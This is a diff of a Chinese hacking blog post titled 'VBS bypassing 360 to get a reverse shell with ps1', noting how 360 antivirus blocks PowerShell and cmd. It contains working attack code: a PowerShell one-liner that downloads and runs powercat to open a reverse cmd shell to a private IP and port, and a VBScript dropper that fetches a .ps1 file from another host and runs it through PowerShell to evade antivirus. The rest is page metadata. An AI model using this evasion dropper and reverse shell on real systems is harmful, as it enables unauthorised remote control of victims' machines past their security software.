@@ -8,14 +8,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Writing">
-<meta property="og:url" content="http://422926799.github.io/Writing/index.html">
+<meta property="og:title" content="Search">
+<meta property="og:url" content="http://422926799.github.io/Search/index.html">
 <meta property="og:site_name" content="九世的博客">
 <meta property="og:description" content="Become a hacker">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-08-05T03:08:20.827Z">
+<meta property="og:updated_time" content="2018-08-05T07:21:18.420Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Writing">
+<meta name="twitter:title" content="Search">
 <meta name="twitter:description" content="Become a hacker">
 
 
@@ -926,7 +926,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-07-28 18:25:44">2019-07-28 17:33</time>
+        创建时间:<time class="date" title="更新时间: 2019-07-28 18:28:16">2019-07-28 17:33</time>
         
     </div>
     <div class="article-meta">
@@ -967,6 +967,7 @@
 
 <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>中午开始想从360手上搞点好果汁吃。奈何360太流氓，一句拦截行天下<br><img src="https://s2.ax1x.com/2019/07/28/elTVeI.png" alt="elTVeI.png"></p>
 <h2 id="得出来的结果"><a href="#得出来的结果" class="headerlink" title="得出来的结果"></a>得出来的结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">360不拦截本机执行powershell，但是拦截其他进程调用powershell</span><br><span class="line">cmd也是一个道理</span><br><span class="line"></span><br><span class="line">是先执行被拦截的进程，被检测到然后360结束进程</span><br><span class="line"></span><br><span class="line">vbs下载只有下载保存的文件后缀不为hta、exe就不会被拦截,可以保存为txt、ps1</span><br><span class="line">有360的机子，不能将文件重命名为exe、hta</span><br><span class="line">但是，用系统本身存在的功能进行远程下载它会拦截，用第三方的远程下载器并不会拦截</span><br><span class="line">360对powershell拦截的不是内容，拦截的是参数</span><br></pre></td></tr></table></figure>
+<p>ijps1<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span>);powercat -c <span class="number">192.168</span>.<span class="number">241.147</span> -p <span class="number">4445</span> -e cmd</span><br></pre></td></tr></table></figure></p>
 <p>vbs<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Set post=CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">post.Open &quot;GET&quot;,&quot;http://192.168.3.4/ij.ps1&quot;</span><br><span class="line">&apos;发送请求</span><br><span class="line">post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">&apos;等待3秒，等文件下载</span><br><span class="line">wscript.sleep 3000 </span><br><span class="line">aGet.Write(post.responseBody)&apos;写数据</span><br><span class="line">aGet.SaveToFile &quot;ij.ps1&quot;,2</span><br><span class="line"></span><br><span class="line">set ws=wscript.createobject(&quot;wscript.shell&quot;)</span><br><span class="line">ret=ws.run (&quot;powershell -nologo -file ij.ps1&quot; ,3,true)</span><br></pre></td></tr></table></figure></p>
 <p>测试结果：<br><img src="https://s2.ax1x.com/2019/07/28/elTNkV.gif" alt="elTNkV.md.gif"></p>
 <p>PS:绕过是绕过，但是是落地执行</p>
@@ -987,7 +988,7 @@
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
     <p><span class="copy-title">发布时间:</span>2019-07-28, 17:33:08</p>
-    <p><span class="copy-title">最后更新:</span>2019-07-28, 18:25:44</p>
+    <p><span class="copy-title">最后更新:</span>2019-07-28, 18:28:16</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/93654a0e.html" title="vbs绕过360用ps1反弹shell">http://422926799.github.io/posts/93654a0e.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
